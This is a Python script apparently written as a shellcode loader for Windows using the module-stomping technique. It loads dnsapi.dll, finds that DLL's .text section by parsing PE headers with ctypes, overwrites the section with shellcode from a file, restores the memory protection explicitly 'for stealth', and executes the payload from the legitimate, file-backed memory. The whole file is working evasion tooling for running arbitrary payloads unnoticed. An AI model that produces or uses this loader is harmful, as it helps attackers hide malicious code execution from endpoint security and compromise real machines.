import sys
import ctypes
from ctypes import wintypes

# --- Ctypes Structures for PE Parsing (64-bit) ---

class IMAGE_DOS_HEADER(ctypes.Structure):
    _fields_ = [
        ('e_magic', wintypes.WORD),
        ('e_cblp', wintypes.WORD),
        ('e_cp', wintypes.WORD),
        ('e_crlc', wintypes.WORD),
        ('e_cparhdr', wintypes.WORD),
        ('e_minalloc', wintypes.WORD),
        ('e_maxalloc', wintypes.WORD),
        ('e_ss', wintypes.WORD),
        ('e_sp', wintypes.WORD),
        ('e_csum', wintypes.WORD),
        ('e_ip', wintypes.WORD),
        ('e_cs', wintypes.WORD),
        ('e_lfarlc', wintypes.WORD),
        ('e_ovno', wintypes.WORD),
        ('e_res', wintypes.WORD * 4),
        ('e_oemid', wintypes.WORD),
        ('e_oeminfo', wintypes.WORD),
        ('e_res2', wintypes.WORD * 10),
        ('e_lfanew', wintypes.LONG),
    ]

class IMAGE_FILE_HEADER(ctypes.Structure):
    _fields_ = [
        ('Machine', wintypes.WORD),
        ('NumberOfSections', wintypes.WORD),
        ('TimeDateStamp', wintypes.DWORD),
        ('PointerToSymbolTable', wintypes.DWORD),
        ('NumberOfSymbols', wintypes.DWORD),
        ('SizeOfOptionalHeader', wintypes.WORD),
        ('Characteristics', wintypes.WORD),
    ]

class IMAGE_OPTIONAL_HEADER64(ctypes.Structure):
    _fields_ = [
        ('Magic', wintypes.WORD),
        ('MajorLinkerVersion', ctypes.c_byte),
        ('MinorLinkerVersion', ctypes.c_byte),
        ('SizeOfCode', wintypes.DWORD),
        ('SizeOfInitializedData', wintypes.DWORD),
        ('SizeOfUninitializedData', wintypes.DWORD),
        ('AddressOfEntryPoint', wintypes.DWORD),
        ('BaseOfCode', wintypes.DWORD),
        # No BaseOfData in x64
        # FIX: Replaced non-existent wintypes.ULONGLONG with ctypes.c_ulonglong
        ('ImageBase', ctypes.c_ulonglong),
        ('SectionAlignment', wintypes.DWORD),
        ('FileAlignment', wintypes.DWORD),
        ('MajorOperatingSystemVersion', wintypes.WORD),
        ('MinorOperatingSystemVersion', wintypes.WORD),
        ('MajorImageVersion', wintypes.WORD),
        ('MinorImageVersion', wintypes.WORD),
        ('MajorSubsystemVersion', wintypes.WORD),
        ('MinorSubsystemVersion', wintypes.WORD),
        ('Win32VersionValue', wintypes.DWORD),
        ('SizeOfImage', wintypes.DWORD),
        ('SizeOfHeaders', wintypes.DWORD),
        ('CheckSum', wintypes.DWORD),
        ('Subsystem', wintypes.WORD),
        ('DllCharacteristics', wintypes.WORD),
        # FIX: Replaced non-existent wintypes.ULONGLONG with ctypes.c_ulonglong
        ('SizeOfStackReserve', ctypes.c_ulonglong),
        ('SizeOfStackCommit', ctypes.c_ulonglong),
        ('SizeOfHeapReserve', ctypes.c_ulonglong),
        ('SizeOfHeapCommit', ctypes.c_ulonglong),
        ('LoaderFlags', wintypes.DWORD),
        ('NumberOfRvaAndSizes', wintypes.DWORD),
        # IMAGE_DATA_DIRECTORY DataDirectory[16]
    ]

class IMAGE_NT_HEADERS64(ctypes.Structure):
    _fields_ = [
        ('Signature', wintypes.DWORD),
        ('FileHeader', IMAGE_FILE_HEADER),
        ('OptionalHeader', IMAGE_OPTIONAL_HEADER64),
    ]

class IMAGE_SECTION_HEADER(ctypes.Structure):
    _fields_ = [
        ('Name', ctypes.c_char * 8),
        ('Misc_VirtualSize', wintypes.DWORD),
        ('VirtualAddress', wintypes.DWORD),
        ('SizeOfRawData', wintypes.DWORD),
        ('PointerToRawData', wintypes.DWORD),
        ('PointerToRelocations', wintypes.DWORD),
        ('PointerToLinenumbers', wintypes.DWORD),
        ('NumberOfRelocations', wintypes.WORD),
        ('NumberOfLinenumbers', wintypes.WORD),
        ('Characteristics', wintypes.DWORD),
    ]

# --- Constants and Windows API Definitions ---

# Extend wintypes for 64-bit compatibility
wintypes.SIZE_T = ctypes.c_size_t
wintypes.LPDWORD = ctypes.POINTER(wintypes.DWORD)
wintypes.LPVOID = ctypes.c_void_p

# Windows API setup
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

# LoadLibraryA: Loads the specified module into the address space of the calling process.
LoadLibraryA = kernel32.LoadLibraryA
LoadLibraryA.argtypes = [wintypes.LPCSTR]
LoadLibraryA.restype = wintypes.HMODULE

# GetModuleHandleA: Retrieves a module handle for the specified module.
GetModuleHandleA = kernel32.GetModuleHandleA
GetModuleHandleA.argtypes = [wintypes.LPCSTR]
GetModuleHandleA.restype = wintypes.HMODULE

# VirtualProtect: Changes the protection on a region of committed pages.
VirtualProtect = kernel32.VirtualProtect
VirtualProtect.argtypes = [wintypes.LPVOID, wintypes.SIZE_T, wintypes.DWORD, wintypes.LPDWORD]
VirtualProtect.restype = wintypes.BOOL

# Memory protection constants
PAGE_EXECUTE_READWRITE = 0x40
PAGE_EXECUTE_READ = 0x20

def find_text_section(module_base):
    """Parses a module in memory to find the address and size of its .text section."""
    try:
        dos_header = IMAGE_DOS_HEADER.from_address(module_base)
        nt_headers_ptr = module_base + dos_header.e_lfanew
        nt_headers = IMAGE_NT_HEADERS64.from_address(nt_headers_ptr)

        # The first section header is immediately after the NT_HEADERS
        section_header_ptr = nt_headers_ptr + ctypes.sizeof(IMAGE_NT_HEADERS64)

        for i in range(nt_headers.FileHeader.NumberOfSections):
            section_header = IMAGE_SECTION_HEADER.from_address(section_header_ptr)
            
            # Check for the .text section
            if section_header.Name.strip(b'\x00') == b'.text':
                text_section_rva = section_header.VirtualAddress
                text_section_size = section_header.Misc_VirtualSize
                return (module_base + text_section_rva, text_section_size)
            
            # Move to the next section header
            section_header_ptr += ctypes.sizeof(IMAGE_SECTION_HEADER)
            
    except Exception as e:
        sys.stderr.write(f"Error parsing PE header: {e}\n")
        return (None, None)
        
    return (None, None)

def main():
    if len(sys.argv) < 2:
        sys.stderr.write(f"Usage: {sys.argv[0]} <path_to_shellcode.bin>\n")
        sys.exit(1)

    shellcode_path = sys.argv[1]
    try:
        with open(shellcode_path, 'rb') as f:
            payload = f.read()
    except FileNotFoundError:
        sys.stderr.write(f"Error: File not found at '{shellcode_path}'\n")
        sys.exit(1)
    except Exception as e:
        sys.stderr.write(f"An error occurred while reading the file: {e}\n")
        sys.exit(1)

    payload_len = len(payload)
    if payload_len == 0:
        sys.stderr.write("Error: Shellcode file is empty.\n")
        sys.exit(1)

    # 1. Load a legitimate DLL to stomp. dnsapi.dll is a good, common candidate.
    dll_name = b"dnsapi.dll"
    h_module = LoadLibraryA(dll_name)
    if not h_module:
        sys.stderr.write(f"Error: LoadLibraryA failed for {dll_name.decode()} with code {ctypes.get_last_error()}\n")
        sys.exit(1)

    module_base = GetModuleHandleA(dll_name)
    if not module_base:
        sys.stderr.write(f"Error: GetModuleHandleA failed for {dll_name.decode()} with code {ctypes.get_last_error()}\n")
        sys.exit(1)
    
    # 2. Find the address and size of the .text section of the loaded DLL.
    text_section_addr, text_section_size = find_text_section(module_base)
    if not text_section_addr:
        sys.stderr.write(f"Error: Could not find the .text section in {dll_name.decode()}.\n")
        sys.exit(1)
    
    if payload_len > text_section_size:
        sys.stderr.write(f"Error: Shellcode size ({payload_len} bytes) is larger than the .text section ({text_section_size} bytes).\n")
        sys.exit(1)

    # 3. Change the .text section's memory protection to allow writing.
    old_protect = wintypes.DWORD(0)
    protect_res = VirtualProtect(
        ctypes.c_void_p(text_section_addr),
        wintypes.SIZE_T(payload_len),
        PAGE_EXECUTE_READWRITE,
        ctypes.byref(old_protect)
    )
    if not protect_res:
        sys.stderr.write(f"Error: VirtualProtect (to RWX) failed with code {ctypes.get_last_error()}\n")
        sys.exit(1)

    # 4. Copy the shellcode into the .text section.
    ctypes.memmove(ctypes.c_void_p(text_section_addr), payload, payload_len)

    # 5. Restore original memory permissions. This is good practice for stealth.
    restore_protect = wintypes.DWORD(0)
    VirtualProtect(
        ctypes.c_void_p(text_section_addr),
        wintypes.SIZE_T(payload_len),
        old_protect, # Use the original protection constant
        ctypes.byref(restore_protect)
    )
    # No need to check the return here, as the critical part is done.

    # 6. Create a function pointer and execute the shellcode.
    # The shellcode now resides in a legitimate, file-backed memory region.
    shellcode_func = ctypes.CFUNCTYPE(None)(text_section_addr)
    # print(f"Executing shellcode stomped into {dll_name.decode()} at 0x{text_section_addr:016X}...")
    shellcode_func()
    # print("Execution finished.")

    return 0

if __name__ == "__main__":
    main()